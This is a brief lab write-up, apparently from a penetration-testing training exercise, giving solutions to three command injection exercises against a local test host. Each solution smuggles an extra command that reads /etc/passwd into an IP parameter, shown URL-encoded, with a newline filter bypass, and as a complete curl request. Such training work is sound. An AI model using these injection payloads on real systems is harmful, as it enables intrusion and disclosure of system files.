# Phase III: Vulnerbility discovery & Exploitation
## Command Injection
| excercise | solution |
|___________|__________|
| example 1 | 10.0.2.4+%26%26+cat+%2Fetc%2Fpasswd 10.0.2.4 && cat /etc/passwd|
| example 2 | 10.0.2.4%0A%26%26+cat+%2Fetc%2Fpasswd 10.0.2.4(New Line)&& cat /etc/passwd|
| example 3 | curl -X GET http://10.0.2.4/commandexec/example3.php?ip=10.0.2.4%0A%26%26+cat+%2Fetc%2Fpasswd |